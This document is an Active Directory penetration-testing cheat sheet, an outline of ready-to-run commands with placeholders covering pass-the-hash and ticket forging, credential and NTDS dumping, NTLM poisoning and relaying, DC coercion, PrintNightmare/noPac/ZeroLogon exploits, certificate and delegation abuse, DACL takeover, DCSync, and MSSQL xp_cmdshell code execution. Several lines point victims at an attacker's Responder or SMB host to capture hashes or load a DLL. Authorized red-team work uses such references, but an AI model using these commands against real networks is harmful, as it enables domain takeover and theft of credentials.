# Active Directory
*   [Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/)
*   Authentication
    *   Password
        *   NXC           → `-u [USER] -p [PASS] -d [DOMAIN] [--local-auth]` → Add `-k` if `STATUS_NOT_SUPPORTED` 
        *   Impacket → `[DOMAIN]/[USER]:[PASS]@[IP]`
    *   User Hashes
        *   NXC                                   → `-u [USER] -H [HASH] -d [DOMAIN] [--local-auth]` → Add `-k` if `STATUS_NOT_SUPPORTED` 
        *   Impacket                         → `[DOMAIN]/[USER]@[IP] -hashes [HASH]`
        *   Password Conversion  → `iconv -f ASCII -t UTF-16LE <(printf "[PASS]") | openssl dgst -md4`
        *   Cracking                          → `hashcat -m 1000`
    *   Service Hashes
        *   `ticketer.py -nthash [SERVICE_HASH] -domain-sid [SID] -domain [DOMAIN] -dc-ip [DC_IP] -spn [SPN] Administrator`
        *   Get SID                            → `nxc ldap [DC_IP] --kdcHost [DC_FQDN] -k [AUTH_STRING] --get-sid`
        *   Password Conversion  → `iconv -f ASCII -t UTF-16LE <(printf "[PASS]") | openssl dgst -md4`
        *   Cracking                          → `hashcat -m 1000`
        *   Export Ticket                  → Impersonate Service Administrator + [SPN Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#abusing-service-tickets)
    *   Kerberos (TGT / PFX / TGS)
        *   Request                   → `getTGT.py [AUTH_STRING]` → `export KRB5CCNAME=[TICKET.ccache]`
        *   NXC                           → `--kdcHost [DC_FQDN] --use-kcache -d [DOMAIN] [--local-auth]` 
        *   Impacket                 → `[DOMAIN]/[USER]@[IP] -k -no-pass`
        *   Win/Lin Convert    → `ticketConverter.py [KIRBI/CCACHE_IN] [KIRBI/CCACHE_OUT]`
        *   [KB Realm Configuration](https://mayfly277.github.io/posts/GOADv2-pwning_part1/)
            *   `addhost [IP] [DOMAIN]` → `addhost [IP] [DC_HOSTNAME]`
            *   `configure_krb5.py [DOMAIN] [DC_NETBIOS_NAME]`
            *   `sudo rdate -n [DC_IP]` 
    *   RDP
        *   `xfreerdp /u:[USER] /p:'[PASS]' /v:[IP] [/pth:HASH] [--local-auth] +clipboard` 
        *   RDP NTLM               → `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
        *   RDP Group              → `net localgroup "Remote Desktop Users" [USER] /add`
    *   WinRM
        *   `evil-winrm -i [IP] -u [USER] [-p/H] [PASS/HASH]`  → Check `menu` + Commands
        *   CCACHE Auth    → `-i [DC_FQDN] -r [DOMAIN]`
        *   WinRM Group    → `net localgroup "Remote Management Users" [USER] /add` 
*   Local Admin
    *   Account Check
        *   `nxc [service] [IP] [ AUTH_STRING] [--local-auth]` → Check if `(Pwn3d!)` appears
    *   SMB RCE
        *   `nxc [IP] [AUTH_STRING] -x [CMD]`
        *   `nxc [IP] [AUTH_STRING] -X [PS_COMMAND] [--amsi-bypass /PATH/TO/PAYLOAD]`
    *   Hash Dumping
        *   `nxc smb [IP] [AUTH_STRING] -M lsassy -M nanodump`
        *   `nxc smb [IP] [AUTH_STRING] --lsa --dpapi --sam --ntds`
        *   `nxc smb [IP] [AUTH_STRING] --sccm [disk/wmi]`
        *   `nxc smb [IP] [AUTH_STRING] -M wifi -M keepass_discover -M veeam -M winscp -M vnc -M mremoteng -M rdcman -M teams_localdb -M security-questions`
    *   SMB / RPC Session
        *   `psexec.py   [AUTH_STRING] cmd.exe`
        *   `smbexec.py  [AUTH_STRING]`
        *   `atexec.py   [AUTH_STRING]`
        *   `wmiexec.py  [AUTH_STRING]`
        *   `dcomexec.py [AUTH_STRING] -object MMC20`
    *   Trust Escalations (Domain Admin)
        *   `nxc ldap [DC_IP] [AUTH_STRING] -M enum_trusts`
        *   [Child-Forest](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/trust-sid-hijacking/) → SID History Attack
        *   [Cross-Forest](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/trust-ticket/)
*   SMB
    *   Null / Guest Binding
        *   `nxc smb [IP] -u '' -p ''`
        *   `nxc smb [IP] -u Guest -p ''`
    *   User Enumeration
        *   `nxc smb [IP] [AUTH_STRING] --users --groups --pass-pol`
        *   `nxc smb [IP] [AUTH_STRING] --rid-brute 10000`
    *   Shares Enumeration
        *   `nxc smb [IP] [AUTH_STRING] --shares`
        *   `smbclient -L \\[IP] [-U [USER%PASS]]`
        *   Data Access
            *   SMBClient Native         → `smbclient \\\\[IP]\\[SHARE] [-U [USER%PASS]]`
            *   Impacket Client            → `smbclient.py [AUTH_STRING]` → `help` / `shares`
            *   Recursive Download   → `nxc smb [IP] [AUTH_STRING] -M spider_plus -o DOWNLOAD_FLAG=True`
            *   Single Download          → `nxc smb [IP] [AUTH_STRING] --get-file '[FILE]' [OUT] --share "[SHARE]"`
            *   Local Mounting            → `mount -t cifs -o "username=[USER]" //[IP]/[SHARE] /mnt/[SHARE]`
        *   LLMNR
            *   [NTLM\_Theft](https://github.com/Greenwolf/ntlm_theft) → Share File Dropping
            *   `nxc smb [IP] [AUTH_STRING] -M slinky -o SERVER=[RESPONDER_IP]`
            *   `nxc smb [IP] [AUTH_STRING] -M scuffy -o SERVER=[RESPONDER_IP]`
            *   Cracking → `hashcat -m 5600`
    *   RPC Access
        *   Null / Guest Binding
            *   `rpcclient -U "%"      -N [IP]`
            *   `rpcclient -U "Guest%" -N [IP]`
        *   Enumeration
            *   `rpcclient -U '[USER]%[PASS]' [IP]`
            *   Queries
                *   `enumdomusers`   → `queryuser  [USERNAME]` 
                *   `enumdomgroups` → `querygroup [GROUP_NAME]`
                *   `querydispinfo` / `enumprinters`
                *   `querydominfo`   / `srvinfo` / `getdompwinfo`
    *   GPP / LAPS / GMSA Read
        *   `nxc smb  [IP] [AUTH_STRING] -M gpp_password`
        *   `nxc smb  [IP] [AUTH_STRING] --laps`
        *   `nxc ldap [DC_IP] [AUTH_STRING] --gmsa`
    *   DC Exploits
        *   `nxc smb [IP] [AUTH_STRING] -M printnightmare -M zerologon -M nopac -M smbghost -M ms17-010`
        *   [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675.git) → `CVE-2021-1675.py [AUTH_STRING] '\\[YOUR_SMB_IP]\[SHARE]\[SHELL.dll]'`
        *   [NoPAC](https://github.com/Ridter/noPac.git)                  → `noPac.py [AUTH_STRING] --impersonate administrator -use-ldap -dump`
        *   [ZeroLogon](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/ZeroLogon/)
        *   SMBGhost / MS17-010 / SMB Vulnerabilities
    *   NTLM Poisoning
        *   LLMNR
            *   `respond()`
            *   RFI / XXE / SSRF / [NTLM\_Theft](https://github.com/Greenwolf/ntlm_theft) / MSSQL
            *   Phishing / Client Forms  → Responder Link / Bad-PDF / [NTLM\_Thef](https://github.com/Greenwolf/ntlm_theft) Office Files
            *   Cracking                              → `hashcat -m 5600`
        *   Unsigned Relaying
            *   `respond()` → HTTP/SMB = Off
            *   `nxc smb [ALIVE_IPS] --gen-relay-list [OUT_FILE]`
            *   `MultiRelay.py -t [UNSIGNED_IP] -u ALL -d`
            *   `ntlmrelayx --no-http-server -smb2support -t [UNSIGNED_IP]`
        *   DHCPv6 Takeover
            *   `sudo mitm6 -I [NIC] -d [DOMAIN]`
            *   `ntlmrelayx.py -6 -wh fakewpad.[DOMAIN] -t ldap://[DC_IP]:[PORT]`
        *   DC Coercion
            *   `respond()`
            *   `nxc smb [DC_IP] [AUTH_STRING] -M coerce_plus -o LISTENER=[RESPONDER_IP] ALWAYS=true`    
            *   [PrivExchange](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/PrivExchange/) → User with Exchange Mailbox
    *   SCCM Abuse
        *   `sccmhunter.py smb -u [USER] -p [PASS] -d [DOMAIN] -dc-ip [DC_IP] -save`
        *   `sccmhunter.py show -all`
        *   [Exploitation](https://www.thehacker.recipes/ad/movement/sccm-mecm/privilege-escalation)
        *   [Admin Hunting](https://www.thehacker.recipes/ad/movement/sccm-mecm/lateral-movement)
*   LDAP
    *   User Enumeration
        *   LDAP Query         → `nxc ldap [DC_IP] [AUTH_STRING] --query "(sAMAccountType=805306368)" "sAMAccountName description memberOf"`
        *   KB Bruteforcing  → `kerbrute userenum -d [DOMAIN] [GENERATED_USERS.txt] --dc [DC_IP] -d [DOMAIN]`
        *   Full DB Dump     → `ldeep [AUTH_STRING] -d [DOMAIN] -s ldap://[DC_IP] all [OUT_DIR]` → [Data Parsing](https://github.com/franc-pentest/ldeep)
    *   Domain Roasting
        *   [Clock Sync](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-tricks/#kerberos-clock-synchronization)
            *   `sudo timedatectl set-ntp off`
            *   `sudo rdate -n [DC_IP]`
        *   ASREP
            *   `nxc ldap [DC_IP] -u [VALID_USERS.txt] -p '' --asreproast --kdcHost [DOMAIN]`
            *   `nxc ldap [DC_IP] [AUTH_STRING] --asreproast --kdcHost [DOMAIN]`
            *   Cracking → `hashcat -m 18200`
        *   KBR
            *   `nxc ldap              [DC_IP] [AUTH_STRING] --kerberoasting --kdcHost [DOMAIN]`
            *   `GetUserSPNs.py        [DOMAIN]/ -no-preauth [ASREP_USERNAME] -usersfile [VALID_USERS.txt] -dc-ip [DC_IP]`
            *   `targetedKerberoast.py [AUTH_STRING] -dc-ip [DC_IP] -d [DOMAIN]`
            *   Cracking → `hashcat -m 13100`
    *   Certificate Abuse
        *   [ESC Exploitations](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
        *   Enumeration
            *   `nxc ldap [DC_IP]    [AUTH_STRING] -M adcs`
            *   `certipy-ad find     [AUTH_STRING] -scheme ldap -debug -dc-ip [DC_IP] -vulnerable -stdout`
            *   `certipy-ad template [AUTH_STRING] -template [TEMPLATE_NAME] -dc-ip [DC_IP]`
        *   Template Hijacking
            *   `certipy-ad template [AUTH_STRING] -template [TEMPLATE] -target [DC_HOSTNAME] -dc-ip [DC_IP]`
            *   `certipy-ad req      [AUTH_STRING] -ca [CA_NAME] -target [DC_HOSTNAME] -dc-ip [DC_IP] -template [TEMPLATE] -upn Administrator@[DOMAIN] -ns [DC_IP] -dns [DC_IP]`
            *   `certipy-ad auth -pfx [PFX_FILE] -dc-ip [DC_IP]`
        *   UPN Hijacking
            *   `certipy-ad account update [AUTH_STRING] -user [VULN_USER] -upn "Administrator" -dc-ip [DC_IP]`
            *   `certipy-ad req [VULN_USER_AUTH_STRING] -target [DC_IP] -ca [CA_NAME] -template [TEMPLATE] -dc-ip [DC_IP]`
            *   `certipy-ad account update [AUTH_STRING] -user [VULN_USER] -upn "[VULN_USER]@[DOMAIN]" -dc-ip [DC_IP]`
            *   `certipy-ad auth -pfx [PFX_FILE] -domain [DOMAIN] -dc-ip [DC_IP]`
    *   [Delegation Abuse](https://www.thehacker.recipes/ad/movement/kerberos/delegations/)
        *   Unconstrained
            *   `nxc ldap [DC_IP] [AUTH_STRING] --trusted-for-delegation`
            *   `Invoke-Rubeus -Command "dump /nowrap"`
            *   `Invoke-Rubeus -Command "monitor /monitorinterval:10 /targetuser:dc1$ /nowrap"`
        *   Constrained
            *   `nxc ldap [DC_IP] [AUTH_STRING] --find-delegation`
            *   `getST.py [AUTH_STRING] -dc-ip [DC_IP] -spn [TRUSTED_SPN] -impersonate Administrator`
            *   [Without Protocol Transition](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)
        *   Resource Delegation
            *   `nxc ldap [DC_IP] [AUTH_STRING] --find-delegation`
            *   Computer Account
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add computer "FAKE$" "password123"`
                *   `nxc smb [DC_IP] -u "FAKE$" -p password123 --delegate Administrator --self [CREDENTIAL_DUMPING_FLAGS]`
            *   User Account
                *   `rbcd.py [AUTH_STRING] -delegate-from '[USER]' -delegate-to '[DC_FQDN]$' -dc-ip '[DC_IP]' -action 'write'`
                *   `nxc smb [DC_IP] -u [USER] -p/H [PASS/HASH] --delegate Administrator [CREDENTIAL_DUMPING_FLAGS]`
    *   [DACL Abuse](https://www.thehacker.recipes/ad/movement/dacl/)
        *   Enumeration
            *   `bloodhound-python -u [USER] -p [PASS] [--hashes HASH] -ns [DC_IP] -d [DOMAIN] -c all --zip [--dns-tcp]`
            *   Mark Owned + Outbound Controls / Shortest Paths + Abuse Functions
        *   Exploitation
            *   Set Ownership
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] set owner "[OBJECT]" "[USER]"`
            *   Set GenericAll / FullControl
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add genericall "[OBJECT]" “[USER]”`
                *   `dacledit.py -action 'write' -rights 'FullControl' -principal '[USER] -target '[OBJECT]' [AUTH_STRING]`
            *   Shadow Hash Steal 
                *   `certipy-ad shadow auto [AUTH_STRING] -account "[TARGET_USER]" -dc-ip [DC_IP]`
            *   Password Reset
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] set password "[TARGET_USER]" "[PASS]"`
            *   Add Group Member
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add groupMember "[GROUP]" “[USER]”`
            *   Targeted ASREPRoast
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add uac [USER] -f DONT_REQ_PREAUTH`
            *   Set DCSync
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] add dcsync "[USER]"`
                *   `secretsdumpy.py [AUTH_STRING]` → On DC
            *   GPO Escalation
                *   `pygpoabuse [AUTH_STRING] -gpo-id "[GPO_ID]"`
                *   From Local Session → `gpupdate /force`
            *   Enable Account
                *   `bloodyAD --host "[DC_IP]" -d "[DOMAIN]" [AUTH_STRING] remove uac [USER] -f ACCOUNTDISABLE`
*   MSSQL
    *   `mssqclient.py [AUTH_STRING] [-windows-auth]`
    *   User Permissions
        *   `SELECT * FROM fn_my_permissions(NULL, 'SERVER');`
        *   Check Admin / Read / Write / Directives
    *   DB Dumping
        *   `enum_db` → `use [DB_NAME]`
        *   `SELECT TABLE_NAME FROM [DB].INFORMATION_SCHEMA.TABLES;`
        *   `SELECT * FROM [TABLE];`
    *   LLMNR
        *   `EXEC master..xp_dirtree '\\[RESPONDER_IP]\x'`
        *   Cracking        → `hashcat -m 5600`
        *   Service Hash → Impersonate Administrator + RCE
    *   User Impersonation
        *   NXC
            *   `nxc mssql [IP] [AUTH_STRING] -M mssql_priv`
            *   `nxc mssql [IP] [AUTH_STRING] -M mssql_priv -o ACTION=privesc`
            *   `nxc mssql [IP] [AUTH_STRING] -q '[MSSQL_QUERY]'`
        *   Manual
            *   `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
            *   `EXECUTE AS LOGIN = ‘[PRIVILEGED_USER]’`
    *   OS Read / Upload
        *   Download              → `nxc mssql [IP] [AUTH_STRING] --get-file C:\\[SRC] [OUT]`
        *   Upload                    → `nxc mssql [IP] [AUTH_STRING] --put-file [SRC] C:\\Windows\\Temp\\[OUT]`
        *   Directory Listing   → `EXEC master..xp_dirtree [OS_DIR]`
        *   File Read                 → `SELECT * FROM OPENROWSET(BULK N'[PATH\\TO\\FILE]', SINGLE_CLOB) AS Contents`
    *   Linked Instances
        *   `SELECT * FROM master..sysservers;` → Check if `IsRemote = 0`
        *   `EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = password'') AT [[INSTANCE]]`
        *   `EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [[INSTANCE]]`
        *   `EXECUTE('[MSSQL_QUERY]') AT [[INSTANCE]]`
    *   RCE (Admin)
        *   `enable_xp_cmdshell`
        *   `xp_cmdshell [CMD]` 
        *   NXC → `nxc mssql [IP] [AUTH_STRING] -x/X [CMD/PS_COMMAND]`